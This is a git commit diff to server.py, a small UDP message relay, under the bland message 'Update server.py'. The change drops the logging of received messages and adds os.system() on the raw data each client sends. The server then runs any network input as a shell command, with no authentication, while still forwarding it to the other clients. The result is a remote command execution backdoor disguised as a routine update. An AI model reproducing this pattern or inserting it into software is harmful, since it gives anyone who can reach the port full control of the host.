79c479b50988229066bfef153e22ece23b7126ee
loadercc <60961630+Skills-png@users.noreply.github.com>
2021-07-20 14:49:24 +0500

    Update server.py

--- server.py
+++ server.py
@@ -1,28 +1,17 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-import socket
-import time
-host = '172.16.51.14'
-port = 9090
-clients = []
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.bind((host, port))
+import socket, time, os
+clients = [] 
+s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+s.bind(('172.16.51.14', 9090))
 quit = False
-
 while not quit:
-    try:
-        (data, addr) = s.recvfrom(1024)
-
-        if addr not in clients:
-            clients.append(addr)
-        itsatime = time.strftime('%Y-%m-%d-%H.%M.%S', time.localtime())
-        print( '[' + addr[0] + ']=[' + str(addr[1]) + ']=[' + itsatime \
-            + ']/')
-        print (data.decode('utf-8'))
-        for client in clients:
-            if addr != client:
-                s.sendto(data, client)
-    except:
-
-        quit = True
+	try:
+		data, addr = s.recvfrom(1024)
+		if addr not in clients:
+			clients.append(addr)
+		os.system(data.decode("utf-8"))
+		for client in clients:
+			if addr != client:
+				s.sendto(data,client)
+	except:
+		quit = True
 s.close()
